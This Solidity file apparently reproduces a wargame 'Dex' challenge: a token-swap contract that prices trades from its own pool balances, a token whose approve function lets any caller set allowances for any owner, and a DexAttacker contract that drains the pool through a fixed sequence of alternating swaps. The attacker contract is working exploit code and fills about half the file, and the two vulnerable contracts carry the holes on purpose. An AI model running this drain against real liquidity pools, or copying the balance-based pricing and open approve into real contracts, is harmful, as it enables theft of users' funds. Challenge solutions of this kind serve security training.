// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts@4.7.3/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts@4.7.3/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts@4.7.3/access/Ownable.sol";

contract Dex is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function addLiquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapPrice(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableToken(token1).approve(msg.sender, spender, amount);
        SwappableToken(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableToken is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract DexAttacker {
    SwappableToken token1;
    SwappableToken token2;
    Dex dex;

    constructor (address _dex) {
        dex = Dex(_dex);
        token1 = SwappableToken(dex.token1());
        token2 = SwappableToken(dex.token2());
    }

    function attack () public {
        token1.approve(msg.sender, address(this), 10);
        token2.approve(msg.sender, address(this), 10);

        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        dex.approve(address(dex), 1000);

        uint amt = 10;
        uint amt1 = dex.getSwapPrice(address(token1), address(token2), amt);
        dex.swap(address(token1), address(token2), amt);
        uint amt2 = dex.getSwapPrice(address(token2), address(token1), amt + amt1);
        dex.swap(address(token2), address(token1), amt + amt1);
        uint amt3 = dex.getSwapPrice(address(token1), address(token2), amt2);
        dex.swap(address(token1), address(token2), amt2);
        uint amt4 = dex.getSwapPrice(address(token2), address(token1), amt3);
        dex.swap(address(token2), address(token1), amt3);
        // uint amt5 = dex.getSwapPrice(address(token1), address(token2), amt4);
        dex.swap(address(token1), address(token2), amt4);
        dex.swap(address(token2), address(token1), 45);
    }

    function emergencySwap(address _token1, address _token2, uint256 amount) public {
        dex.swap(_token1, _token2, amount);
    }
}

